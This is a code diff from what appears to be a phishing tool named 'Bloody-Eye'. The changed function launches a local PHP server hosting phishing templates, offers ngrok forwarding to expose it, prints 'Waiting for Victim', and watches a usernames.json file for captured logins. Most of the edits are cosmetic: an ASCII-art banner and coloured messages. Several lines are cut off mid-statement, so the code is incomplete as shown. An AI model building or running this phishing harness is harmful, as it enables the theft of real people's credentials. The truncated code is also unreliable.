@@ -566,20 +566,39 @@ def ngrokserver():
              print(" ")
              sys.exit()
     
-    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
+    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Ser$
     if v == "01":
-      print("")
+      os.system("clear")
+      print (Fore.BLUE+"""
+..............
+            ..,;:ccc,.
+          ......''';lxO.
+.....''''..........,:ld;
+           .';;;:::;,,.x,
+      ..'''.            0Xxoc:,.  ...
+  ....                ,ONkc;,;cokOdc',.
+ .                   OMo           ':ddo.
+                    dMc               :OO;
+                    0M.                 .:o.
+                    ;Wd
+                     ;XO,
+                       ,d0Odlc;,..
+                           ..',;:cdOOd::,.
+                                    .:d;.':;.
+                                       'd,  .'
+                                         ;l   ..
+                                          .o
+                                            c
+                                            .'
+                                             .""")  
       time.sleep(0.07)
       with open("log","w") as phplog:
-         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-      print("")
+         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout$
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : http://127.0.0.1:6060$
       time.sleep(0.07)
-      print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim, "+Fore.BLUE+$ 
     elif v == "02":
        ngrokserver()
-
-       
     def userin():
         global stat_file
         if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
